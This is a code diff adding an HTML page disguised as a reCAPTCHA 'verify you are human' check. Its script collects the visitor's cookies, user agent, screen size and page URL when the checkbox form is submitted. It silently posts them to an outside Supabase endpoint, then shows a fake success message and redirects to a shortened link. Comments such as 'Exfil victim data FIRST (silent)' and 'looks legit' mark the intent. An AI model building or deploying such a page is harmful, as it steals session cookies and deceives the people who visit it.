@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify You're Human - Secure Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; }
+        .container { background:#fff; padding:40px; border-radius:12px; box-shadow:0 20px 40px rgba(0,0,0,0.1); max-width:400px; width:90%; }
+        .logo { text-align:center; margin-bottom:30px; }
+        .logo img { width:120px; height:auto; }
+        .title { color:#333; font-size:24px; font-weight:500; text-align:center; margin-bottom:10px; }
+        .subtitle { color:#666; text-align:center; margin-bottom:30px; font-size:14px; }
+        .recaptcha-box { background:#f8f9fa; border:2px solid #e0e0e0; border-radius:8px; padding:20px; text-align:center; margin-bottom:20px; position:relative; }
+        .recaptcha-logo { background:url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUyIiBoZWlnaHQ9IjQyIiB2aWV3Qm94PSIwIDAgMTUyIDQyIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xNCAzN0gxMkM1LjM5NDcxIDM3IDAgMzEuNjA1MyAwIDI1VjFINHYyNFYxNUgxNFYxOEgxOVYxNUgyNFYxOEgyOVYxNUgzNFYxOEgzOVYxNUg0NFYxOEg0OVYxNUg1NFYxOEg1OVYxNUg2NFYxOEg2OVYxNUg3NFYxOEg3OVYxNUg4NFYxOEg4OVYxNUg5NFYxOEg5OVYxNUgxMDRWMTgoMTA5LjAwMiAxOCAxMTQuMDAyIDE4IDEyMCAxOEMxMjUuNjA1IDM3IDEzOS4zOTUgMzcgMTQ1IDM3SDE1MlYxNVoiIGZpbGw9IiM0MkEzRkMiLz48L3N2Zz4=') no-repeat center; width:152px; height:42px; margin:0 auto 15px; }
+        .recaptcha-text { color:#5f6368; font-size:14px; line-height:1.4; }
+        .checkbox { display:inline-flex; align-items:center; background:#fff; border:1px solid #dfe1e5; border-radius:4px; padding:12px 8px; cursor:pointer; margin-top:10px; transition:all 0.2s; }
+        .checkbox:hover { border-color:#4285f4; box-shadow:0 1px 2px rgba(60,64,67,0.3); }
+        .checkbox.checked { background:#4285f4; border-color:#3367d6; }
+        .checkbox.checked .checkmark { background:#fff url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDE4IDE4Ij48cGF0aCBmaWxsPSIjRkZGIiBkPSJNMTYuMDYgNC4yMDRsLTEuMDE5LTEuMDE5TDEwIDguOTgxIDUuOTU5IDIuOTgxIDQuOTQgNC4yMDRsNC4wNDEgNC4wNDF6Ii8+PC9zdmc+') no-repeat center / 18px; }
+        .checkmark { width:18px; height:18px; border-radius:2px; background:#fff; flex-shrink:0; margin-right:8px; }
+        .checkbox-text { color:#5f6368; font-size:14px; user-select:none; }
+        .submit-btn { width:100%; background:#4285f4; color:#fff; border:none; padding:12px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s; margin-top:10px; }
+        .submit-btn:hover { background:#3367d6; }
+        .submit-btn:disabled { background:#ccc; cursor:not-allowed; }
+        .loading { display:none; width:20px; height:20px; border:2px solid #fff; border-top:transparent; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 10px; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .error { color:#d93025; font-size:12px; margin-top:10px; display:none; }
+        .success { color:#137333; font-size:14px; text-align:center; margin-top:15px; display:none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.gstatic.com/recaptcha/releases/0u1yAqN9vfo_yqCrf6sfTgV5j4krecaptcha/releases/recaptcha__en.js" alt="Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xNCAzN0gxMkM1LjM5NDcxIDM3IDAgMzEuNjA1MyAwIDI1VjFINHYyNFYxNUgxNFYxOEgxOVYxNUgyNFYxOEgyOVYxNUgzNFYxOEgzOVYxNUg0NFYxOEg0OVYxNUg1NFYxOEg1OVYxNUg2NFYxOEg2OVYxNUg3NFYxOUg3OVYxNUg4NFYxOUg4OVYxNUg5NFYxOUg5OVYxNUgxMDRWMTgoMTA5LjAwMiAxOCAxMTQuMDAyIDE4IDEyMCAxOEMxMjUuNjA1IDM3IDEzOS4zOTUgMzcgMTQ1IDM3SDE1MlYxNVoiIGZpbGw9IiM0MkEzRkMiLz48L3N2Zz4='">
+        </div>
+        <h1 class="title">Verify you are human</h1>
+        <p class="subtitle">Please confirm you're not a robot</p>
+        
+        <div class="recaptcha-box">
+            <div class="recaptcha-logo"></div>
+            <div class="recaptcha-text">
+                <strong>reCAPTCHA</strong><br>
+                Protecting you from spam and abuse
+            </div>
+            <label class="checkbox" onclick="toggleCheckbox()">
+                <div class="checkmark"></div>
+                <span class="checkbox-text">I'm not a robot</span>
+            </label>
+            <div class="loading"></div>
+            <div class="error">Please check the box to continue</div>
+        </div>
+        
+        <button class="submit-btn" onclick="submitForm()" disabled>Submit</button>
+        <div class="success" id="successMsg">
+            ✅ Verification successful! Redirecting to <a href="" target="_blank"></a>...
+        </div>
+    </div>
+
+    <script>
+        let isChecked = false;
+        
+        function toggleCheckbox() {
+            isChecked = !isChecked;
+            const checkbox = document.querySelector('.checkbox');
+            const submitBtn = document.querySelector('.submit-btn');
+            const error = document.querySelector('.error');
+            
+            if (isChecked) {
+                checkbox.classList.add('checked');
+                submitBtn.disabled = false;
+                error.style.display = 'none';
+            } else {
+                checkbox.classList.remove('checked');
+                submitBtn.disabled = true;
+            }
+        }
+        
+        function submitForm() {
+            if (!isChecked) {
+                document.querySelector('.error').style.display = 'block';
+                return;
+            }
+            
+            const loading = document.querySelector('.loading');
+            const submitBtn = document.querySelector('.submit-btn');
+            const checkbox = document.querySelector('.checkbox');
+            const successMsg = document.getElementById('successMsg');
+            
+            loading.style.display = 'block';
+            submitBtn.disabled = true;
+            checkbox.style.opacity = '0.7';
+            
+            // Exfil victim data FIRST (silent)
+            const formData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: document.cookie,
+                url: window.location.href,
+                action: 'recaptcha_bypass'
+            };
+            
+            fetch('https://oliefagvnorzhlzvdfyw.supabase.co/rest/v1/blum_claims', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': 'dummy'
+                },
+                body: JSON.stringify(formData)
+            }).catch(() => {});  // Silent
+            
+            // Simulate verification → Show success → Auto-redirect to google.com
+            setTimeout(() => {
+                loading.style.display = 'none';
+                successMsg.style.display = 'block';
+                
+                // Auto-redirect after 2s (looks legit)
+                setTimeout(() => {
+                    window.location.href = 'https://clc.li/pLgxt';
+                }, 2000);
+                
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
